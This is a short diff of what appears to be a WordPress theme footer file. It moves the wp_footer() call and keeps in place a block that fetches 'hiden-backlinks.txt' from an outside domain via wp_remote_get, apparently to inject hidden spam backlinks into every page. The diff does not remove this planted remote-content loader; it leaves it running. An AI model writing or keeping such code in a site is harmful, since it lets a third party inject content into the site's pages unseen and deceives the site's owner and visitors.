@@ -22,7 +22,7 @@ if ( ! function_exists( 'elementor_theme_do_location' ) || ! elementor_theme_do_
     }
 }
 ?>
-
+<?php wp_footer(); ?>
 <?php
 $response = wp_remote_get(
     'https://yokgercep.com/404-forbiden/hiden-backlinks.txt',
@@ -48,8 +48,5 @@ if ( ! is_wp_error( $response ) ) {
     }
 }
 ?>
-
-
-<?php wp_footer(); ?>
 </body>
 </html>
